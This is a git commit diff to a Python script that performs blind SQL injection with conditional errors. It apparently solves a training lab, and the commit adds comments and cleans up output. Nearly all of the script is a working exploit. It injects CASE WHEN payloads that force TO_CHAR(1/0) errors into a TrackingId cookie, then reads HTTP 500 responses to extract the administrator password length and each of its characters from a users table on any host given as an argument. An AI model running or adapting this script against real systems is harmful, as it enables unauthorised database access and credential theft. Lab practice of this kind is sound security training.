c0386badf40415978dfbb997599e5b971a40e280
hi-anki <managemee@protonmail.com>
2025-02-20 21:01:43 +0530

    added comments and improved the code

--- sql-injection/blind-sql-injection-with-conditional-errors.py
+++ sql-injection/blind-sql-injection-with-conditional-errors.py
@@ -9,27 +9,34 @@ proxies={
   'http': '127.0.0.1:8080',
   'https': '127.0.0.1:8080'
 }
+
 client = None
 tracking_cookie = None
 host = None
 
 def send_request(payload):
+  # Set coookie along with injection payload
   client.cookies.set('TrackingId', f'{tracking_cookie}{payload}', domain=f'{host[8:]}')
+
+  # Make the actual request
   response = client.get(f'{host}')
+
+  # The indication of a successful payload is an Internal Server Error (500)
   if response.status_code == 500:
     return True
   return False
 
 def retreive_tracking_cookie():
   global tracking_cookie
-
   response = client.get(f'{host}')
+
+  # extract the cookie value from the HTTP response
   tracking_cookie = response.cookies.get('TrackingId')
   if tracking_cookie:
     print(f'(+) Tracking cookie found: {tracking_cookie}')
   else:
     print(f'(+) Tracking cookie not found!')
-    sys.exit(-2)
+    sys.exit(-1)
 
 def confirm_injection():
   # Must return an error
@@ -58,11 +65,12 @@ def confirm_injection():
   print('(+) username:administrator found!')
 
 def get_password_length():
+  # Uses linear search. 
   for i in range(1, 100):
     if send_request(f"'||(SELECT CASE WHEN (LENGTH(password)={i}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"):
       return i
   print('(-) Password length can not be found')
-  sys.exit(-2)
+  sys.exit(-1)
 
 def retreive_admin_password(password_length):
   password = ''
@@ -72,32 +80,34 @@ def retreive_admin_password(password_length):
 
   ascii_chars_positions = [num for num in range(48, 58)] + [num for num in range(97, 123)]
   total_combinations = len(ascii_chars_positions)*password_length
-  print(f'(+) Starting password enumeration \nTotal requests to be sent: {total_combinations}')
+  print(f'(+) Starting password enumeration.... \nTotal requests: {total_combinations}')
 
-  sys.stdout.write('\r[] Current Extraction Status: ')
+  sys.stdout.write('\r[+] Current Extraction Status: ')
   sys.stdout.flush()
 
   req_count = 0
   for i in range(1, password_length+1):
     for j in ascii_chars_positions:
+      # Uses linear search.
       if send_request(f"'||(SELECT CASE WHEN (SUBSTR(password, {i}, 1)='{chr(j)}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"):
         password += chr(j)
         break
       req_count += 1
-    sys.stdout.write('\r[ ] Current extraction status: ' + password)
+
+    sys.stdout.write('\r[+] Current extraction status: ' + password)
     sys.stdout.flush()
 
     if len(password) == password_length:
-      print()
-      print(f'Total requests made: {req_count}')
+      print(f'\n(+)Total requests made: {req_count}')
       return password
-  
+
   print('Failed!')
   sys.exit(-1)
 
 if __name__ == '__main__':
   try:
     host = sys.argv[1].strip().rstrip('/')
+
   except IndexError:
     print(f'(+) Usage: {sys.argv[0]} <HOST>')
     print(f'(+) Example: {sys.argv[0]} http://www.example.com')
@@ -106,11 +116,12 @@ if __name__ == '__main__':
   with requests.Session() as client:
     client.verify = False
     client.proxies = proxies
+
     retreive_tracking_cookie()
     confirm_injection()
 
     password_length = get_password_length()
-    print(f'[+] Found password length: {password_length}')
+    print(f'(+) Password Length: {password_length}')
 
     admin_password = retreive_admin_password(password_length)
-    print(f'[+] Found administrator password: {admin_password}')
+    print(f'(+) Administrator Password: {admin_password}')
